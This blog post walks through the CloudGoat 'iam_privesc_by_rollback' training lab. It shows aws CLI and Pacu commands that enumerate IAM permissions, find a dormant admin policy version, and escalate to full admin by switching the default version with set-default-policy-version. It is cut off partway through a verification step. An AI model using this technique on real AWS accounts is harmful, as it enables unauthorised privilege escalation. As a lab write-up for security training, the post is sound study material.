+<link rel="shortcut icon" href=/favicon.ico><link rel=stylesheet href=https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css integrity=sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T crossorigin=anonymous><link rel=stylesheet href=/css/main.css><title>iam_privesc_by_rollback | jellyparks</title></head><body><header></header><div class=site-wrapper><div class="sticky top-bar"><div id=mySidenav class=sidenav include-nav=/nav.html></div><span class="sticky hamburger" style=font-size:30px;cursor:pointer onclick=openNav()>&#9776;</span></div><div class=container><div class=blog-header><h1>iam_privesc_by_rollback</h1></div><div class=row><div class="col-sm-8 blog-main"><div class=blog-post><hr><p>According to the official documentation for this scenario (<a href=https://github.com/RhinoSecurityLabs/cloudgoat/tree/master/scenarios/iam_privesc_by_rollback>here</a>) the overall goal is to &ldquo;Acquire full admin privileges.&rdquo;</p><p>We can create the challenge by running</p><div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>python3 cloudgoat.py create iam_privesc_by_rollback
+</span></span></code></pre></td></tr></table></div></div><p>The build process will begin and when it finishes we will be provided with a set of credentials for the Raynor user account.</p><hr><h3 id=raynor>Raynor</h3><p>In the real world, we probably wouldn&rsquo;t just be handed these credentials. However, people make mistakes and credentials are often accidentally exposed. Let&rsquo;s start doing basic enumeration and see if we can determine what things we have access to. To do this we&rsquo;ll run the following set of commands just to poke at a few of the more common services:</p><div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>aws --profile solus s3 ls
+</span></span><span style=display:flex><span>aws --profile solus ec2 describe-instances
+</span></span><span style=display:flex><span>aws --profile solus iam list-roles
+</span></span><span style=display:flex><span>aws --profile solus lambda list-functions
+</span></span></code></pre></td></tr></table></div></div><p>All of the api calls fail with the exeption being iam list-roles. We can clean the output up by using jq:</p><div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>aws --profile raynor iam list-roles | jq <span style=color:#0c6>&#39;.Roles[].RoleName&#39;</span>
+</span></span></code></pre></td></tr></table></div></div><p>This command will produce an output similar to the one below.</p><p><img src=images/jq-list-roles.png alt=jq-list-roles.png class=img-fluid></p><p>The key takeaway here is that we have access to a user account with some level of IAM permissions. How much access do we have? One way to find out is by leveraging Pacu to bruteforce those permissions for us. The other option is to make iam calls one at a time to determine where our limits may exist. For this example we&rsquo;ll leverage Pacu and run the iam__enum_users_roles_policies_groups module.</p><div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>run iam__enum_users_roles_policies_groups
+</span></span></code></pre></td></tr></table></div></div><p>Once the module finishes its execution we see that it successfully enumeated various aspects of the account.</p><p><img src=images/iam-enum-results.png alt=iam-enum-results.png class=img-fluid></p><p>We can run the data <code>IAM command</code> to see information associated with the enumeration. At first glance of the policies it appears there is a specific policy listed for our user account: <code>cg-raynor-policy</code></p><div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span><span style=color:#0c6>&#34;Policies&#34;</span><span style=color:#fff;background-color:#c00>:</span> [
+</span></span><span style=display:flex><span> {
+</span></span><span style=display:flex><span>  <span style=color:#2c5dcd;font-weight:700>&#34;PolicyName&#34;</span>: <span style=color:#0c6>&#34;cg-raynor-policy&#34;</span>,
+</span></span><span style=display:flex><span>  <span style=color:#2c5dcd;font-weight:700>&#34;PolicyId&#34;</span>: <span style=color:#0c6>&#34;ANPA5X73I5MBNC3PRT6CO&#34;</span>,
+</span></span><span style=display:flex><span>  <span style=color:#2c5dcd;font-weight:700>&#34;Arn&#34;</span>: <span style=color:#0c6>&#34;arn:aws:iam::121212121212:policy/cg-raynor-policy&#34;</span>,
+</span></span><span style=display:flex><span>  <span style=color:#2c5dcd;font-weight:700>&#34;Path&#34;</span>: <span style=color:#0c6>&#34;/&#34;</span>,
+</span></span><span style=display:flex><span>  <span style=color:#2c5dcd;font-weight:700>&#34;DefaultVersionId&#34;</span>: <span style=color:#0c6>&#34;v1&#34;</span>,
+</span></span><span style=display:flex><span>  <span style=color:#2c5dcd;font-weight:700>&#34;AttachmentCount&#34;</span>: <span style=color:#5918bb;font-weight:700>1</span>,
+</span></span><span style=display:flex><span>  <span style=color:#2c5dcd;font-weight:700>&#34;IsAttachable&#34;</span>: <span style=color:#2c5dcd;font-weight:700>true</span>,
+</span></span><span style=display:flex><span>  <span style=color:#2c5dcd;font-weight:700>&#34;CreateDate&#34;</span>: <span style=color:#0c6>&#34;Mon, 25 May 2020 14:24:46&#34;</span>,
+</span></span><span style=display:flex><span>  <span style=color:#2c5dcd;font-weight:700>&#34;UpdateDate&#34;</span>: <span style=color:#0c6>&#34;Mon, 25 May 2020 14:24:48&#34;</span>
+</span></span><span style=display:flex><span> }
+</span></span><span style=display:flex><span>]<span style=color:#fff;background-color:#c00>,</span>
+</span></span></code></pre></td></tr></table></div></div><p>Looking at the details above we can also tell that the policy is curently attached <code>AttachmentCount: 1</code> and the version being used is v1 <code>DefaultVersionId: v1</code>. If we wanted to leverage the aws cli in place of Pacu we could run the command below. The command is filtering to show only those policies which are currently attached to a resource.</p><div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>aws --profile raynor iam list-policies --only-attached --scope Local
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#2c5dcd>{</span>
+</span></span><span style=display:flex><span> <span style=color:#0c6>&#34;Policies&#34;</span>: <span style=color:#2c5dcd>[</span>
+</span></span><span style=display:flex><span>  <span style=color:#2c5dcd>{</span>
+</span></span><span style=display:flex><span>   <span style=color:#0c6>&#34;PolicyName&#34;</span>: <span style=color:#0c6>&#34;cg-raynor-policy&#34;</span>,
+</span></span><span style=display:flex><span>   <span style=color:#0c6>&#34;PolicyId&#34;</span>: <span style=color:#0c6>&#34;ANPA5X73I5MBNC3PRT6CO&#34;</span>,
+</span></span><span style=display:flex><span>   <span style=color:#0c6>&#34;Arn&#34;</span>: <span style=color:#0c6>&#34;arn:aws:iam::121212121212:policy/cg-raynor-policy&#34;</span>,
+</span></span><span style=display:flex><span>   <span style=color:#0c6>&#34;Path&#34;</span>: <span style=color:#0c6>&#34;/&#34;</span>,
+</span></span><span style=display:flex><span>   <span style=color:#0c6>&#34;DefaultVersionId&#34;</span>: <span style=color:#0c6>&#34;v1&#34;</span>,
+</span></span><span style=display:flex><span>   <span style=color:#0c6>&#34;AttachmentCount&#34;</span>: 1,
+</span></span><span style=display:flex><span>   <span style=color:#0c6>&#34;PermissionsBoundaryUsageCount&#34;</span>: 0,
+</span></span><span style=display:flex><span>   <span style=color:#0c6>&#34;IsAttachable&#34;</span>: true,
+</span></span><span style=display:flex><span>   <span style=color:#0c6>&#34;CreateDate&#34;</span>: <span style=color:#0c6>&#34;2020-05-25T14:24:46Z&#34;</span>,
+</span></span><span style=display:flex><span>   <span style=color:#0c6>&#34;UpdateDate&#34;</span>: <span style=color:#0c6>&#34;2020-05-25T14:24:48Z&#34;</span>
+</span></span><span style=display:flex><span>  <span style=color:#2c5dcd>}</span>
+</span></span><span style=display:flex><span> <span style=color:#2c5dcd>]</span>
+</span></span><span style=display:flex><span><span style=color:#2c5dcd>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>The next question we have to answer is the policy attached to our user account? We can do that by quering the list-attached-user-policies endpoint and our user name raynor. An example command and output is below.</p><div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>aws --profile raynor iam list-attached-user-policies --user-name raynor
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#2c5dcd>{</span>
+</span></span><span style=display:flex><span> <span style=color:#0c6>&#34;AttachedPolicies&#34;</span>: <span style=color:#2c5dcd>[</span>
+</span></span><span style=display:flex><span>  <span style=color:#2c5dcd>{</span>
+</span></span><span style=display:flex><span>   <span style=color:#0c6>&#34;PolicyName&#34;</span>: <span style=color:#0c6>&#34;cg-raynor-policy&#34;</span>,
+</span></span><span style=display:flex><span>   <span style=color:#0c6>&#34;PolicyArn&#34;</span>: <span style=color:#0c6>&#34;arn:aws:iam::121212121212:policy/cg-raynor-policy&#34;</span>
+</span></span><span style=display:flex><span>  <span style=color:#2c5dcd>}</span>
+</span></span><span style=display:flex><span> <span style=color:#2c5dcd>]</span>
+</span></span><span style=display:flex><span><span style=color:#2c5dcd>}</span>
+</span></span></code></pre></td></tr></table></div></div><hr><h3 id=versions>Versions</h3><p>Good news, it appears the raynor policy is currently associated with the raynor user account. Lets see if we can learn more about what we are allowed to do and what we are not allowed to do. We can accomplish this by making a call to the <code>get-policy-version</code> endpoint as seen below.</p><div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>aws --profile raynor iam get-policy-version --policy-arn arn:aws:iam::121212121212:policy/cg-raynor-policy --version-id v1
+</span></span><span style=display:flex><span><span style=color:#2c5dcd>{</span>
+</span></span><span style=display:flex><span> <span style=color:#0c6>&#34;PolicyVersion&#34;</span>: <span style=color:#2c5dcd>{</span>
+</span></span><span style=display:flex><span>  <span style=color:#0c6>&#34;Document&#34;</span>: <span style=color:#2c5dcd>{</span>
+</span></span><span style=display:flex><span>   <span style=color:#0c6>&#34;Version&#34;</span>: <span style=color:#0c6>&#34;2012-10-17&#34;</span>,
+</span></span><span style=display:flex><span>   <span style=color:#0c6>&#34;Statement&#34;</span>: <span style=color:#2c5dcd>[</span>
+</span></span><span style=display:flex><span>    <span style=color:#2c5dcd>{</span>
+</span></span><span style=display:flex><span>     <span style=color:#0c6>&#34;Sid&#34;</span>: <span style=color:#0c6>&#34;IAMPrivilegeEscalationByRollback&#34;</span>,
+</span></span><span style=display:flex><span>     <span style=color:#0c6>&#34;Action&#34;</span>: <span style=color:#2c5dcd>[</span>
+</span></span><span style=display:flex><span>      <span style=color:#0c6>&#34;iam:Get*&#34;</span>,
+</span></span><span style=display:flex><span>      <span style=color:#0c6>&#34;iam:List*&#34;</span>,
+</span></span><span style=display:flex><span>      <span style=color:#0c6>&#34;iam:SetDefaultPolicyVersion&#34;</span>
+</span></span><span style=display:flex><span>     <span style=color:#2c5dcd>]</span>,
+</span></span><span style=display:flex><span>     <span style=color:#0c6>&#34;Effect&#34;</span>: <span style=color:#0c6>&#34;Allow&#34;</span>,
+</span></span><span style=display:flex><span>     <span style=color:#0c6>&#34;Resource&#34;</span>: <span style=color:#0c6>&#34;*&#34;</span>
+</span></span><span style=display:flex><span>    <span style=color:#2c5dcd>}</span>
+</span></span><span style=display:flex><span>   <span style=color:#2c5dcd>]</span>
+</span></span><span style=display:flex><span>  <span style=color:#2c5dcd>}</span>,
+</span></span><span style=display:flex><span>  <span style=color:#0c6>&#34;VersionId&#34;</span>: <span style=color:#0c6>&#34;v1&#34;</span>,
+</span></span><span style=display:flex><span>  <span style=color:#0c6>&#34;IsDefaultVersion&#34;</span>: true,
+</span></span><span style=display:flex><span>  <span style=color:#0c6>&#34;CreateDate&#34;</span>: <span style=color:#0c6>&#34;2020-05-25T14:24:46Z&#34;</span>
+</span></span><span style=display:flex><span> <span style=color:#2c5dcd>}</span>
+</span></span><span style=display:flex><span><span style=color:#2c5dcd>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>For the call to work we specified the policy arn as well as the version currently applied. From the output it looks like we can make calls to iam resources if they are a Get, List, or SetDefaultPolicyVersion. That last one is interesting. Perhaps our currently policy has more than one version? Let&rsquo;s check to see if version 2 of our policy exists. The results are below:</p><div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>aws --profile raynor iam get-policy-version --policy-arn arn:aws:iam::121212121212:policy/cg-raynor-policy --version-id v2
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#2c5dcd>{</span>
+</span></span><span style=display:flex><span> <span style=color:#0c6>&#34;PolicyVersion&#34;</span>: <span style=color:#2c5dcd>{</span>
+</span></span><span style=display:flex><span>  <span style=color:#0c6>&#34;Document&#34;</span>: <span style=color:#2c5dcd>{</span>
+</span></span><span style=display:flex><span>   <span style=color:#0c6>&#34;Version&#34;</span>: <span style=color:#0c6>&#34;2012-10-17&#34;</span>,
+</span></span><span style=display:flex><span>   <span style=color:#0c6>&#34;Statement&#34;</span>: <span style=color:#2c5dcd>[</span>
+</span></span><span style=display:flex><span>    <span style=color:#2c5dcd>{</span>
+</span></span><span style=display:flex><span>     <span style=color:#0c6>&#34;Action&#34;</span>: <span style=color:#0c6>&#34;*&#34;</span>,
+</span></span><span style=display:flex><span>     <span style=color:#0c6>&#34;Effect&#34;</span>: <span style=color:#0c6>&#34;Allow&#34;</span>,
+</span></span><span style=display:flex><span>     <span style=color:#0c6>&#34;Resource&#34;</span>: <span style=color:#0c6>&#34;*&#34;</span>
+</span></span><span style=display:flex><span>    <span style=color:#2c5dcd>}</span>
+</span></span><span style=display:flex><span>   <span style=color:#2c5dcd>]</span>
+</span></span><span style=display:flex><span>  <span style=color:#2c5dcd>}</span>,
+</span></span><span style=display:flex><span>  <span style=color:#0c6>&#34;VersionId&#34;</span>: <span style=color:#0c6>&#34;v2&#34;</span>,
+</span></span><span style=display:flex><span>  <span style=color:#0c6>&#34;IsDefaultVersion&#34;</span>: false,
+</span></span><span style=display:flex><span>  <span style=color:#0c6>&#34;CreateDate&#34;</span>: <span style=color:#0c6>&#34;2020-05-25T14:24:48Z&#34;</span>
+</span></span><span style=display:flex><span> <span style=color:#2c5dcd>}</span>
+</span></span><span style=display:flex><span><span style=color:#2c5dcd>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>Interesting, a version 2 of the policy does exist, and it gives full admin access to the entire account. Our current policy provides us with the ability to set the default version of a policy. If we were to change the default version of the policy currently applied to our user account from 1 to 2 we could escalate our privledges to full admin.</p><p>The command below will accomplish this.</p><div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>aws --profile raynor iam set-default-policy-version --policy arn:aws:iam::121212121212:policy/cg-raynor-policy --version-id v2
+</span></span></code></pre></td></tr></table></div></div><p>If successful there will be no response. We can validate the command was successful by re-running the <code>list-policies</code> command:</p><div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
